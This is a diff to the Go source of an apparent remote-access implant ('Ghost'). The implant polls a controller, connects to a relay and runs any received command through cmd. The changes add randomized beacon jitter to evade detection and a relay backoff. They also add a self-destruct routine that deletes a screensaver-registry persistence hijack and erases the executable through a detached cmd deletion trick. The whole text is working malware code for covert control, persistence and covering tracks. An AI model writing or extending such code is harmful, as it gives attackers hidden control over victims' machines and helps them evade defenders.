@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"image/png"
 	"io"
+	"math/rand"
 	"net"
 	"os"
 	"os/exec"
@@ -60,7 +61,8 @@ func main() {
 
 	for {
 		pollAndExecute(targetID)
-		time.Sleep(500 * time.Millisecond)
+		jitter := time.Duration(rand.Intn(10)+5) * time.Second
+		time.Sleep(jitter)
 	}
 }
 
@@ -196,8 +198,11 @@ func pollAndExecute(targetID string) error {
 	c.Close()
 
 	// 4. CONNECT TO RELAY
+	fmt.Printf("[!] Attempting Bridge: %s\n", r.RelayAddr)
 	relayConn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
 	if err != nil {
+		fmt.Printf("[!] Relay Unreachable: %v. Backing off...\n", err)
+		time.Sleep(10 * time.Second) // THE FIX: Stops the infinite loop
 		return nil
 	}
 	defer relayConn.Close()
@@ -357,6 +362,27 @@ func pollAndExecute(targetID string) error {
 			// Success message that will show up in your TUI
 			finalOutput = "[black:green] 🔗 ANCHOR DROPPED [-] [green]Ghost renamed to .scr and Screensaver Hijack active (60s idle).[-]"
 		}
+		// --- SELF DESTRUCT ---
+	} else if strings.HasPrefix(rawCmd, "self_destruct") {
+		fmt.Println("[!] EMERGENCY: Initiating Self-Destruct...")
+
+		// 1. CLEAN THE REGISTRY (Remove the Screensaver Hijack)
+		// We set the screensaver back to "None" and reset the timeout
+		exec.Command("reg", "delete", `HKCU\Control Panel\Desktop`, "/v", "SCRNSAVE.EXE", "/f").Run()
+		exec.Command("reg", "add", `HKCU\Control Panel\Desktop`, "/v", "ScreenSaveActive", "/t", "REG_SZ", "/d", "0", "/f").Run()
+
+		// 2. MARK THE FILE FOR DELETION
+		// Windows won't let a process delete itself while running,
+		// so we use a classic "Cmd" trick to delete it after the process exits.
+		selfPath, _ := os.Executable()
+		delCmd := fmt.Sprintf("timeout /t 5 & del /f /q \"%s\"", selfPath)
+
+		// Spawn a detached cmd process to do the dirty work
+		exec.Command("cmd", "/C", delCmd).Start()
+
+		// 3. EXIT IMMEDIATELY
+		fmt.Println("[X] Ghost Purged. Goodbye.")
+		os.Exit(0)
 	} else {
 		// --- STANDARD COMMAND ---
 		cmdObj := exec.Command("cmd", "/C", rawCmd)
